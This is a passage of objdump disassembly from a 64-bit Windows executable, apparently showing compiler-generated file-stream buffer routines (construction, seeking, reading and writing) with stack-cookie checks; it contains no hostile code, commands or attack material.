   140004b0c:	ff 15 be 36 00 00    	call   *0x36be(%rip)        # 0x1400081d0
   140004b12:	90                   	nop
   140004b13:	48 8b 06             	mov    (%rsi),%rax
   140004b16:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140004b1a:	48 8d 05 d7 45 00 00 	lea    0x45d7(%rip),%rax        # 0x1400090f8
   140004b21:	48 89 04 31          	mov    %rax,(%rcx,%rsi,1)
   140004b25:	48 8b 06             	mov    (%rsi),%rax
   140004b28:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140004b2c:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   140004b32:	89 54 31 fc          	mov    %edx,-0x4(%rcx,%rsi,1)
   140004b36:	48 8b cf             	mov    %rdi,%rcx
   140004b39:	ff 15 f9 36 00 00    	call   *0x36f9(%rip)        # 0x140008238
   140004b3f:	48 8d 05 32 45 00 00 	lea    0x4532(%rip),%rax        # 0x140009078
   140004b46:	48 89 07             	mov    %rax,(%rdi)
   140004b49:	40 88 6f 7c          	mov    %bpl,0x7c(%rdi)
   140004b4d:	40 88 6f 71          	mov    %bpl,0x71(%rdi)
   140004b51:	48 8b cf             	mov    %rdi,%rcx
   140004b54:	ff 15 ee 36 00 00    	call   *0x36ee(%rip)        # 0x140008248
   140004b5a:	48 89 af 80 00 00 00 	mov    %rbp,0x80(%rdi)
   140004b61:	48 8b 05 18 8e 00 00 	mov    0x8e18(%rip),%rax        # 0x14000d980
   140004b68:	48 89 47 74          	mov    %rax,0x74(%rdi)
   140004b6c:	48 89 6f 68          	mov    %rbp,0x68(%rdi)
   140004b70:	ba 32 00 00 00       	mov    $0x32,%edx
   140004b75:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   140004b7b:	48 8b cb             	mov    %rbx,%rcx
   140004b7e:	ff 15 8c 36 00 00    	call   *0x368c(%rip)        # 0x140008210
   140004b84:	48 8b d8             	mov    %rax,%rbx
   140004b87:	48 85 c0             	test   %rax,%rax
   140004b8a:	0f 84 db 00 00 00    	je     0x140004c6b
   140004b90:	c6 47 7c 01          	movb   $0x1,0x7c(%rdi)
   140004b94:	40 88 6f 71          	mov    %bpl,0x71(%rdi)
   140004b98:	48 8b cf             	mov    %rdi,%rcx
   140004b9b:	ff 15 a7 36 00 00    	call   *0x36a7(%rip)        # 0x140008248
   140004ba1:	48 89 6c 24 40       	mov    %rbp,0x40(%rsp)
   140004ba6:	48 89 6c 24 48       	mov    %rbp,0x48(%rsp)
   140004bab:	48 89 6c 24 50       	mov    %rbp,0x50(%rsp)
   140004bb0:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   140004bb5:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
   140004bba:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140004bbf:	48 8b cb             	mov    %rbx,%rcx
   140004bc2:	ff 15 88 39 00 00    	call   *0x3988(%rip)        # 0x140008550
   140004bc8:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140004bcd:	48 89 47 18          	mov    %rax,0x18(%rdi)
   140004bd1:	48 89 47 20          	mov    %rax,0x20(%rdi)
   140004bd5:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   140004bda:	48 89 47 38          	mov    %rax,0x38(%rdi)
   140004bde:	48 89 47 40          	mov    %rax,0x40(%rdi)
   140004be2:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140004be7:	48 89 47 50          	mov    %rax,0x50(%rdi)
   140004beb:	48 89 47 58          	mov    %rax,0x58(%rdi)
   140004bef:	48 89 9f 80 00 00 00 	mov    %rbx,0x80(%rdi)
   140004bf6:	48 8b 05 83 8d 00 00 	mov    0x8d83(%rip),%rax        # 0x14000d980
   140004bfd:	48 89 47 74          	mov    %rax,0x74(%rdi)
   140004c01:	48 89 6f 68          	mov    %rbp,0x68(%rdi)
   140004c05:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140004c0a:	48 8b cf             	mov    %rdi,%rcx
   140004c0d:	ff 15 2d 36 00 00    	call   *0x362d(%rip)        # 0x140008240
   140004c13:	90                   	nop
   140004c14:	48 8b c8             	mov    %rax,%rcx
   140004c17:	e8 74 10 00 00       	call   0x140005c90
   140004c1c:	48 8b d8             	mov    %rax,%rbx
   140004c1f:	48 8b c8             	mov    %rax,%rcx
   140004c22:	ff 15 48 35 00 00    	call   *0x3548(%rip)        # 0x140008170
   140004c28:	84 c0                	test   %al,%al
   140004c2a:	74 06                	je     0x140004c32
   140004c2c:	48 89 6f 68          	mov    %rbp,0x68(%rdi)
   140004c30:	eb 0e                	jmp    0x140004c40
   140004c32:	48 89 5f 68          	mov    %rbx,0x68(%rdi)
   140004c36:	48 8b cf             	mov    %rdi,%rcx
   140004c39:	ff 15 09 36 00 00    	call   *0x3609(%rip)        # 0x140008248
   140004c3f:	90                   	nop
   140004c40:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140004c45:	48 85 c9             	test   %rcx,%rcx
   140004c48:	74 1c                	je     0x140004c66
   140004c4a:	48 8b 01             	mov    (%rcx),%rax
   140004c4d:	ff 50 10             	call   *0x10(%rax)
   140004c50:	48 85 c0             	test   %rax,%rax
   140004c53:	74 11                	je     0x140004c66
   140004c55:	48 8b 08             	mov    (%rax),%rcx
   140004c58:	4c 8b 01             	mov    (%rcx),%r8
   140004c5b:	ba 01 00 00 00       	mov    $0x1,%edx
   140004c60:	48 8b c8             	mov    %rax,%rcx
   140004c63:	41 ff d0             	call   *%r8
   140004c66:	48 85 ff             	test   %rdi,%rdi
   140004c69:	75 19                	jne    0x140004c84
   140004c6b:	48 8b 06             	mov    (%rsi),%rax
   140004c6e:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140004c72:	48 03 ce             	add    %rsi,%rcx
   140004c75:	45 33 c0             	xor    %r8d,%r8d
   140004c78:	ba 02 00 00 00       	mov    $0x2,%edx
   140004c7d:	ff 15 dd 35 00 00    	call   *0x35dd(%rip)        # 0x140008260
   140004c83:	90                   	nop
   140004c84:	48 8b c6             	mov    %rsi,%rax
   140004c87:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140004c8c:	48 33 cc             	xor    %rsp,%rcx
   140004c8f:	e8 ec 1c 00 00       	call   0x140006980
   140004c94:	48 8b 9c 24 a0 00 00 	mov    0xa0(%rsp),%rbx
   140004c9b:	00 
   140004c9c:	48 83 c4 70          	add    $0x70,%rsp
   140004ca0:	5f                   	pop    %rdi
   140004ca1:	5e                   	pop    %rsi
   140004ca2:	5d                   	pop    %rbp
   140004ca3:	c3                   	ret
   140004ca4:	cc                   	int3
   140004ca5:	cc                   	int3
   140004ca6:	cc                   	int3
   140004ca7:	cc                   	int3
   140004ca8:	cc                   	int3
   140004ca9:	cc                   	int3
   140004caa:	cc                   	int3
   140004cab:	cc                   	int3
   140004cac:	cc                   	int3
   140004cad:	cc                   	int3
   140004cae:	cc                   	int3
   140004caf:	cc                   	int3
   140004cb0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004cb5:	57                   	push   %rdi
   140004cb6:	48 83 ec 20          	sub    $0x20,%rsp
   140004cba:	48 8b d9             	mov    %rcx,%rbx
   140004cbd:	48 8b ca             	mov    %rdx,%rcx
   140004cc0:	e8 cb 0f 00 00       	call   0x140005c90
   140004cc5:	48 8b c8             	mov    %rax,%rcx
   140004cc8:	48 8b f8             	mov    %rax,%rdi
   140004ccb:	ff 15 9f 34 00 00    	call   *0x349f(%rip)        # 0x140008170
   140004cd1:	84 c0                	test   %al,%al
   140004cd3:	74 13                	je     0x140004ce8
   140004cd5:	48 c7 43 68 00 00 00 	movq   $0x0,0x68(%rbx)
   140004cdc:	00 
   140004cdd:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004ce2:	48 83 c4 20          	add    $0x20,%rsp
   140004ce6:	5f                   	pop    %rdi
   140004ce7:	c3                   	ret
   140004ce8:	48 8b cb             	mov    %rbx,%rcx
   140004ceb:	48 89 7b 68          	mov    %rdi,0x68(%rbx)
   140004cef:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004cf4:	48 83 c4 20          	add    $0x20,%rsp
   140004cf8:	5f                   	pop    %rdi
   140004cf9:	48 ff 25 48 35 00 00 	rex.W jmp *0x3548(%rip)        # 0x140008248
   140004d00:	40 53                	rex push %rbx
   140004d02:	48 83 ec 20          	sub    $0x20,%rsp
   140004d06:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   140004d0d:	00 
   140004d0e:	48 8b d9             	mov    %rcx,%rbx
   140004d11:	74 2d                	je     0x140004d40
   140004d13:	48 8b 01             	mov    (%rcx),%rax
   140004d16:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   140004d1b:	ff 50 18             	call   *0x18(%rax)
   140004d1e:	83 f8 ff             	cmp    $0xffffffff,%eax
   140004d21:	74 1d                	je     0x140004d40
   140004d23:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   140004d2a:	ff 15 88 38 00 00    	call   *0x3888(%rip)        # 0x1400085b8
   140004d30:	33 c9                	xor    %ecx,%ecx
   140004d32:	85 c0                	test   %eax,%eax
   140004d34:	0f 99 c1             	setns  %cl
   140004d37:	8d 41 ff             	lea    -0x1(%rcx),%eax
   140004d3a:	48 83 c4 20          	add    $0x20,%rsp
   140004d3e:	5b                   	pop    %rbx
   140004d3f:	c3                   	ret
   140004d40:	33 c0                	xor    %eax,%eax
   140004d42:	48 83 c4 20          	add    $0x20,%rsp
   140004d46:	5b                   	pop    %rbx
   140004d47:	c3                   	ret
   140004d48:	cc                   	int3
   140004d49:	cc                   	int3
   140004d4a:	cc                   	int3
   140004d4b:	cc                   	int3
   140004d4c:	cc                   	int3
   140004d4d:	cc                   	int3
   140004d4e:	cc                   	int3
   140004d4f:	cc                   	int3
   140004d50:	40 53                	rex push %rbx
   140004d52:	56                   	push   %rsi
   140004d53:	48 83 ec 48          	sub    $0x48,%rsp
   140004d57:	48 8b 05 e2 82 00 00 	mov    0x82e2(%rip),%rax        # 0x14000d040
   140004d5e:	48 33 c4             	xor    %rsp,%rax
   140004d61:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140004d66:	33 f6                	xor    %esi,%esi
   140004d68:	4d 8b c8             	mov    %r8,%r9
   140004d6b:	48 8b d9             	mov    %rcx,%rbx
   140004d6e:	48 85 d2             	test   %rdx,%rdx
   140004d71:	75 0b                	jne    0x140004d7e
   140004d73:	4d 85 c0             	test   %r8,%r8
   140004d76:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140004d7c:	74 03                	je     0x140004d81
   140004d7e:	44 8b c6             	mov    %esi,%r8d
   140004d81:	48 8b 89 80 00 00 00 	mov    0x80(%rcx),%rcx
   140004d88:	48 85 c9             	test   %rcx,%rcx
   140004d8b:	0f 84 9e 00 00 00    	je     0x140004e2f
   140004d91:	ff 15 c9 37 00 00    	call   *0x37c9(%rip)        # 0x140008560
   140004d97:	85 c0                	test   %eax,%eax
   140004d99:	0f 85 90 00 00 00    	jne    0x140004e2f
   140004d9f:	48 89 7c 24 40       	mov    %rdi,0x40(%rsp)
   140004da4:	48 8b cb             	mov    %rbx,%rcx
   140004da7:	48 8b bb 80 00 00 00 	mov    0x80(%rbx),%rdi
   140004dae:	c6 43 7c 01          	movb   $0x1,0x7c(%rbx)
   140004db2:	40 88 73 71          	mov    %sil,0x71(%rbx)
   140004db6:	ff 15 8c 34 00 00    	call   *0x348c(%rip)        # 0x140008248
   140004dbc:	48 85 ff             	test   %rdi,%rdi
   140004dbf:	74 4e                	je     0x140004e0f
   140004dc1:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   140004dc6:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140004dcb:	4c 8d 44 24 28       	lea    0x28(%rsp),%r8
   140004dd0:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   140004dd5:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140004dda:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140004ddf:	48 8b cf             	mov    %rdi,%rcx
   140004de2:	ff 15 68 37 00 00    	call   *0x3768(%rip)        # 0x140008550
   140004de8:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140004ded:	48 89 4b 18          	mov    %rcx,0x18(%rbx)
   140004df1:	48 89 4b 20          	mov    %rcx,0x20(%rbx)
   140004df5:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140004dfa:	48 89 4b 38          	mov    %rcx,0x38(%rbx)
   140004dfe:	48 89 4b 40          	mov    %rcx,0x40(%rbx)
   140004e02:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140004e07:	48 89 4b 50          	mov    %rcx,0x50(%rbx)
   140004e0b:	48 89 4b 58          	mov    %rcx,0x58(%rbx)
   140004e0f:	48 8b 0d 6a 8b 00 00 	mov    0x8b6a(%rip),%rcx        # 0x14000d980
   140004e16:	48 8b c3             	mov    %rbx,%rax
   140004e19:	48 89 bb 80 00 00 00 	mov    %rdi,0x80(%rbx)
   140004e20:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140004e25:	48 89 4b 74          	mov    %rcx,0x74(%rbx)
   140004e29:	48 89 73 68          	mov    %rsi,0x68(%rbx)
   140004e2d:	eb 02                	jmp    0x140004e31
   140004e2f:	33 c0                	xor    %eax,%eax
   140004e31:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140004e36:	48 33 cc             	xor    %rsp,%rcx
   140004e39:	e8 42 1b 00 00       	call   0x140006980
   140004e3e:	48 83 c4 48          	add    $0x48,%rsp
   140004e42:	5e                   	pop    %rsi
   140004e43:	5b                   	pop    %rbx
   140004e44:	c3                   	ret
   140004e45:	cc                   	int3
   140004e46:	cc                   	int3
   140004e47:	cc                   	int3
   140004e48:	cc                   	int3
   140004e49:	cc                   	int3
   140004e4a:	cc                   	int3
   140004e4b:	cc                   	int3
   140004e4c:	cc                   	int3
   140004e4d:	cc                   	int3
   140004e4e:	cc                   	int3
   140004e4f:	cc                   	int3
   140004e50:	40 53                	rex push %rbx
   140004e52:	56                   	push   %rsi
   140004e53:	57                   	push   %rdi
   140004e54:	48 83 ec 30          	sub    $0x30,%rsp
   140004e58:	48 8b 05 e1 81 00 00 	mov    0x81e1(%rip),%rax        # 0x14000d040
   140004e5f:	48 33 c4             	xor    %rsp,%rax
   140004e62:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140004e67:	49 8b 40 08          	mov    0x8(%r8),%rax
   140004e6b:	49 8b f0             	mov    %r8,%rsi
   140004e6e:	49 03 00             	add    (%r8),%rax
   140004e71:	48 8b da             	mov    %rdx,%rbx
   140004e74:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   140004e7b:	00 
   140004e7c:	48 8b f9             	mov    %rcx,%rdi
   140004e7f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004e84:	74 70                	je     0x140004ef6
   140004e86:	e8 e5 0f 00 00       	call   0x140005e70
   140004e8b:	84 c0                	test   %al,%al
   140004e8d:	74 67                	je     0x140004ef6
   140004e8f:	48 8b 8f 80 00 00 00 	mov    0x80(%rdi),%rcx
   140004e96:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140004e9b:	ff 15 1f 37 00 00    	call   *0x371f(%rip)        # 0x1400085c0
   140004ea1:	85 c0                	test   %eax,%eax
   140004ea3:	75 51                	jne    0x140004ef6
   140004ea5:	48 8b 46 10          	mov    0x10(%rsi),%rax
   140004ea9:	48 8b 4f 18          	mov    0x18(%rdi),%rcx
   140004ead:	48 89 47 74          	mov    %rax,0x74(%rdi)
   140004eb1:	48 8d 47 70          	lea    0x70(%rdi),%rax
   140004eb5:	48 39 01             	cmp    %rax,(%rcx)
   140004eb8:	75 22                	jne    0x140004edc
   140004eba:	48 8b 97 88 00 00 00 	mov    0x88(%rdi),%rdx
   140004ec1:	4c 8b 87 90 00 00 00 	mov    0x90(%rdi),%r8
   140004ec8:	48 89 11             	mov    %rdx,(%rcx)
   140004ecb:	44 2b c2             	sub    %edx,%r8d
   140004ece:	48 8b 4f 38          	mov    0x38(%rdi),%rcx
   140004ed2:	48 89 11             	mov    %rdx,(%rcx)
   140004ed5:	48 8b 4f 50          	mov    0x50(%rdi),%rcx
   140004ed9:	44 89 01             	mov    %r8d,(%rcx)
   140004edc:	48 8b 57 74          	mov    0x74(%rdi),%rdx
   140004ee0:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140004ee5:	48 89 0b             	mov    %rcx,(%rbx)
   140004ee8:	48 89 53 10          	mov    %rdx,0x10(%rbx)
   140004eec:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
   140004ef3:	00 
   140004ef4:	eb 15                	jmp    0x140004f0b
   140004ef6:	33 c0                	xor    %eax,%eax
   140004ef8:	48 c7 03 ff ff ff ff 	movq   $0xffffffffffffffff,(%rbx)
   140004eff:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
   140004f06:	00 
   140004f07:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140004f0b:	48 8b c3             	mov    %rbx,%rax
   140004f0e:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140004f13:	48 33 cc             	xor    %rsp,%rcx
   140004f16:	e8 65 1a 00 00       	call   0x140006980
   140004f1b:	48 83 c4 30          	add    $0x30,%rsp
   140004f1f:	5f                   	pop    %rdi
   140004f20:	5e                   	pop    %rsi
   140004f21:	5b                   	pop    %rbx
   140004f22:	c3                   	ret
   140004f23:	cc                   	int3
   140004f24:	cc                   	int3
   140004f25:	cc                   	int3
   140004f26:	cc                   	int3
   140004f27:	cc                   	int3
   140004f28:	cc                   	int3
   140004f29:	cc                   	int3
   140004f2a:	cc                   	int3
   140004f2b:	cc                   	int3
   140004f2c:	cc                   	int3
   140004f2d:	cc                   	int3
   140004f2e:	cc                   	int3
   140004f2f:	cc                   	int3
   140004f30:	40 53                	rex push %rbx
   140004f32:	55                   	push   %rbp
   140004f33:	56                   	push   %rsi
   140004f34:	57                   	push   %rdi
   140004f35:	41 56                	push   %r14
   140004f37:	48 83 ec 30          	sub    $0x30,%rsp
   140004f3b:	48 8b 05 fe 80 00 00 	mov    0x80fe(%rip),%rax        # 0x14000d040
   140004f42:	48 33 c4             	xor    %rsp,%rax
   140004f45:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140004f4a:	48 8b 41 38          	mov    0x38(%rcx),%rax
   140004f4e:	4c 8d 71 70          	lea    0x70(%rcx),%r14
   140004f52:	41 8b e9             	mov    %r9d,%ebp
   140004f55:	49 8b f0             	mov    %r8,%rsi
   140004f58:	48 8b fa             	mov    %rdx,%rdi
   140004f5b:	48 8b d9             	mov    %rcx,%rbx
   140004f5e:	4c 39 30             	cmp    %r14,(%rax)
   140004f61:	75 10                	jne    0x140004f73
   140004f63:	41 83 f9 01          	cmp    $0x1,%r9d
   140004f67:	75 0a                	jne    0x140004f73
   140004f69:	48 83 79 68 00       	cmpq   $0x0,0x68(%rcx)
   140004f6e:	75 03                	jne    0x140004f73
   140004f70:	48 ff ce             	dec    %rsi
   140004f73:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   140004f7a:	00 
   140004f7b:	0f 84 85 00 00 00    	je     0x140005006
   140004f81:	e8 ea 0e 00 00       	call   0x140005e70
   140004f86:	84 c0                	test   %al,%al
   140004f88:	74 7c                	je     0x140005006
   140004f8a:	48 85 f6             	test   %rsi,%rsi
   140004f8d:	75 05                	jne    0x140004f94
   140004f8f:	83 fd 01             	cmp    $0x1,%ebp
   140004f92:	74 17                	je     0x140004fab
   140004f94:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   140004f9b:	44 8b c5             	mov    %ebp,%r8d
   140004f9e:	48 8b d6             	mov    %rsi,%rdx
   140004fa1:	ff 15 d9 35 00 00    	call   *0x35d9(%rip)        # 0x140008580
   140004fa7:	85 c0                	test   %eax,%eax
   140004fa9:	75 5b                	jne    0x140005006
   140004fab:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   140004fb2:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140004fb7:	ff 15 ab 35 00 00    	call   *0x35ab(%rip)        # 0x140008568
   140004fbd:	85 c0                	test   %eax,%eax
   140004fbf:	75 45                	jne    0x140005006
   140004fc1:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140004fc5:	4c 39 30             	cmp    %r14,(%rax)
   140004fc8:	75 22                	jne    0x140004fec
   140004fca:	48 8b 93 88 00 00 00 	mov    0x88(%rbx),%rdx
   140004fd1:	4c 8b 83 90 00 00 00 	mov    0x90(%rbx),%r8
   140004fd8:	48 89 10             	mov    %rdx,(%rax)
   140004fdb:	44 2b c2             	sub    %edx,%r8d
   140004fde:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   140004fe2:	48 89 11             	mov    %rdx,(%rcx)
   140004fe5:	48 8b 4b 50          	mov    0x50(%rbx),%rcx
   140004fe9:	44 89 01             	mov    %r8d,(%rcx)
   140004fec:	48 8b 53 74          	mov    0x74(%rbx),%rdx
   140004ff0:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140004ff5:	48 89 0f             	mov    %rcx,(%rdi)
   140004ff8:	48 89 57 10          	mov    %rdx,0x10(%rdi)
   140004ffc:	48 c7 47 08 00 00 00 	movq   $0x0,0x8(%rdi)
   140005003:	00 
   140005004:	eb 15                	jmp    0x14000501b
   140005006:	33 c0                	xor    %eax,%eax
   140005008:	48 c7 07 ff ff ff ff 	movq   $0xffffffffffffffff,(%rdi)
   14000500f:	48 c7 47 08 00 00 00 	movq   $0x0,0x8(%rdi)
   140005016:	00 
   140005017:	48 89 47 10          	mov    %rax,0x10(%rdi)
   14000501b:	48 8b c7             	mov    %rdi,%rax
   14000501e:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140005023:	48 33 cc             	xor    %rsp,%rcx
   140005026:	e8 55 19 00 00       	call   0x140006980
   14000502b:	48 83 c4 30          	add    $0x30,%rsp
   14000502f:	41 5e                	pop    %r14
   140005031:	5f                   	pop    %rdi
   140005032:	5e                   	pop    %rsi
   140005033:	5d                   	pop    %rbp
   140005034:	5b                   	pop    %rbx
   140005035:	c3                   	ret
   140005036:	cc                   	int3
   140005037:	cc                   	int3
   140005038:	cc                   	int3
   140005039:	cc                   	int3
   14000503a:	cc                   	int3
   14000503b:	cc                   	int3
   14000503c:	cc                   	int3
   14000503d:	cc                   	int3
   14000503e:	cc                   	int3
   14000503f:	cc                   	int3
   140005040:	40 53                	rex push %rbx
   140005042:	55                   	push   %rbp
   140005043:	57                   	push   %rdi
   140005044:	48 83 ec 20          	sub    $0x20,%rsp
   140005048:	48 83 79 68 00       	cmpq   $0x0,0x68(%rcx)
   14000504d:	49 8b d8             	mov    %r8,%rbx
   140005050:	48 8b ea             	mov    %rdx,%rbp
   140005053:	48 8b f9             	mov    %rcx,%rdi
   140005056:	74 0e                	je     0x140005066
   140005058:	48 83 c4 20          	add    $0x20,%rsp
   14000505c:	5f                   	pop    %rdi
   14000505d:	5d                   	pop    %rbp
   14000505e:	5b                   	pop    %rbx
   14000505f:	48 ff 25 32 31 00 00 	rex.W jmp *0x3132(%rip)        # 0x140008198
   140005066:	48 8b 41 40          	mov    0x40(%rcx),%rax
   14000506a:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   14000506f:	48 8b f3             	mov    %rbx,%rsi
   140005072:	4c 89 74 24 48       	mov    %r14,0x48(%rsp)
   140005077:	4c 89 7c 24 58       	mov    %r15,0x58(%rsp)
   14000507c:	4c 8b 08             	mov    (%rax),%r9
   14000507f:	4d 85 c9             	test   %r9,%r9
   140005082:	74 08                	je     0x14000508c
   140005084:	48 8b 41 58          	mov    0x58(%rcx),%rax
   140005088:	8b 08                	mov    (%rax),%ecx
   14000508a:	eb 02                	jmp    0x14000508e
   14000508c:	33 c9                	xor    %ecx,%ecx
   14000508e:	4c 63 f9             	movslq %ecx,%r15
   140005091:	48 85 db             	test   %rbx,%rbx
   140005094:	7e 52                	jle    0x1400050e8
   140005096:	85 c9                	test   %ecx,%ecx
   140005098:	7e 2e                	jle    0x1400050c8
   14000509a:	49 3b df             	cmp    %r15,%rbx
   14000509d:	49 8b c9             	mov    %r9,%rcx
   1400050a0:	4c 0f 4c fb          	cmovl  %rbx,%r15
   1400050a4:	4d 8b c7             	mov    %r15,%r8
   1400050a7:	e8 5f 29 00 00       	call   0x140007a0b
   1400050ac:	48 8b 47 58          	mov    0x58(%rdi),%rax
   1400050b0:	49 2b df             	sub    %r15,%rbx
   1400050b3:	49 03 ef             	add    %r15,%rbp
   1400050b6:	44 29 38             	sub    %r15d,(%rax)
   1400050b9:	48 8b 4f 40          	mov    0x40(%rdi),%rcx
   1400050bd:	49 63 c7             	movslq %r15d,%rax
   1400050c0:	48 01 01             	add    %rax,(%rcx)
   1400050c3:	48 85 db             	test   %rbx,%rbx
   1400050c6:	7e 20                	jle    0x1400050e8
   1400050c8:	4c 8b 8f 80 00 00 00 	mov    0x80(%rdi),%r9
   1400050cf:	4d 85 c9             	test   %r9,%r9
   1400050d2:	74 14                	je     0x1400050e8
   1400050d4:	4c 8b c3             	mov    %rbx,%r8
   1400050d7:	ba 01 00 00 00       	mov    $0x1,%edx
   1400050dc:	48 8b cd             	mov    %rbp,%rcx
   1400050df:	ff 15 8b 34 00 00    	call   *0x348b(%rip)        # 0x140008570
   1400050e5:	48 2b d8             	sub    %rax,%rbx
   1400050e8:	4c 8b 7c 24 58       	mov    0x58(%rsp),%r15
   1400050ed:	48 2b f3             	sub    %rbx,%rsi
   1400050f0:	4c 8b 74 24 48       	mov    0x48(%rsp),%r14
   1400050f5:	48 8b c6             	mov    %rsi,%rax
   1400050f8:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400050fd:	48 83 c4 20          	add    $0x20,%rsp
   140005101:	5f                   	pop    %rdi
   140005102:	5d                   	pop    %rbp
   140005103:	5b                   	pop    %rbx
   140005104:	c3                   	ret
   140005105:	cc                   	int3
   140005106:	cc                   	int3
   140005107:	cc                   	int3
   140005108:	cc                   	int3
   140005109:	cc                   	int3
   14000510a:	cc                   	int3
   14000510b:	cc                   	int3
   14000510c:	cc                   	int3
   14000510d:	cc                   	int3
   14000510e:	cc                   	int3
   14000510f:	cc                   	int3
   140005110:	40 55                	rex push %rbp
   140005112:	56                   	push   %rsi
   140005113:	41 56                	push   %r14
   140005115:	48 83 ec 30          	sub    $0x30,%rsp
   140005119:	4d 8b f0             	mov    %r8,%r14
   14000511c:	48 8b ea             	mov    %rdx,%rbp
   14000511f:	48 8b f1             	mov    %rcx,%rsi
   140005122:	4d 85 c0             	test   %r8,%r8
   140005125:	7f 0b                	jg     0x140005132
   140005127:	33 c0                	xor    %eax,%eax
   140005129:	48 83 c4 30          	add    $0x30,%rsp
   14000512d:	41 5e                	pop    %r14
   14000512f:	5e                   	pop    %rsi
   140005130:	5d                   	pop    %rbp
   140005131:	c3                   	ret
   140005132:	48 83 79 68 00       	cmpq   $0x0,0x68(%rcx)
   140005137:	74 0f                	je     0x140005148
   140005139:	48 83 c4 30          	add    $0x30,%rsp
   14000513d:	41 5e                	pop    %r14
   14000513f:	5e                   	pop    %rsi
   140005140:	5d                   	pop    %rbp
   140005141:	48 ff 25 58 30 00 00 	rex.W jmp *0x3058(%rip)        # 0x1400081a0
   140005148:	48 8b 41 38          	mov    0x38(%rcx),%rax
   14000514c:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   140005151:	49 8b de             	mov    %r14,%rbx
   140005154:	48 8b 10             	mov    (%rax),%rdx
   140005157:	48 85 d2             	test   %rdx,%rdx
   14000515a:	74 08                	je     0x140005164
   14000515c:	48 8b 41 50          	mov    0x50(%rcx),%rax
   140005160:	8b 08                	mov    (%rax),%ecx
   140005162:	eb 02                	jmp    0x140005166
   140005164:	33 c9                	xor    %ecx,%ecx
   140005166:	48 63 c1             	movslq %ecx,%rax
   140005169:	85 c9                	test   %ecx,%ecx
   14000516b:	74 35                	je     0x1400051a2
   14000516d:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140005172:	49 3b c6             	cmp    %r14,%rax
   140005175:	49 8b fe             	mov    %r14,%rdi
   140005178:	48 8b cd             	mov    %rbp,%rcx
   14000517b:	48 0f 42 f8          	cmovb  %rax,%rdi
   14000517f:	4c 8b c7             	mov    %rdi,%r8
   140005182:	e8 84 28 00 00       	call   0x140007a0b
   140005187:	48 8b 46 50          	mov    0x50(%rsi),%rax
   14000518b:	48 03 ef             	add    %rdi,%rbp
   14000518e:	48 2b df             	sub    %rdi,%rbx
   140005191:	29 38                	sub    %edi,(%rax)
   140005193:	48 8b 4e 38          	mov    0x38(%rsi),%rcx
   140005197:	48 63 c7             	movslq %edi,%rax
   14000519a:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   14000519f:	48 01 01             	add    %rax,(%rcx)
   1400051a2:	48 83 be 80 00 00 00 	cmpq   $0x0,0x80(%rsi)
   1400051a9:	00 
   1400051aa:	0f 84 8e 00 00 00    	je     0x14000523e
   1400051b0:	4c 8b 46 18          	mov    0x18(%rsi),%r8
   1400051b4:	48 8d 46 70          	lea    0x70(%rsi),%rax
   1400051b8:	49 39 00             	cmp    %rax,(%r8)
   1400051bb:	75 20                	jne    0x1400051dd
   1400051bd:	48 8b 8e 88 00 00 00 	mov    0x88(%rsi),%rcx
   1400051c4:	48 8b 96 90 00 00 00 	mov    0x90(%rsi),%rdx
   1400051cb:	49 89 08             	mov    %rcx,(%r8)
   1400051ce:	2b d1                	sub    %ecx,%edx
   1400051d0:	48 8b 46 38          	mov    0x38(%rsi),%rax
